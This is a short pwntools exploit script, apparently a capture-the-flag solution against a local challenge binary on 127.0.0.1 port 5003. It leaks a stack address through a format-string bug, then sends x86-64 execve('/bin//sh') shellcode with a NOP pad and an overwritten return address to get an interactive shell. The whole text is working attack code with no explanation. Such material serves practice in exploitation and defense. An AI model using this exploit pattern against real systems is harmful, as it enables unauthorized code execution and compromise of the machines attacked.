from pwn import *

#io = process("./chall")
io = remote("127.0.0.1", 5003)

io.sendlineafter(b"number!", b"%14$p")

io.recvline()
leak = int(io.recvline()[4:], 16) - 0x50

print(f"===== Stack: {hex(leak)}")

shell = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
payload = shell + b"\x90" * (0x48 - len(shell)) + p64(leak)

io.sendlineafter(b"VBUCKS!", payload)

io.interactive()

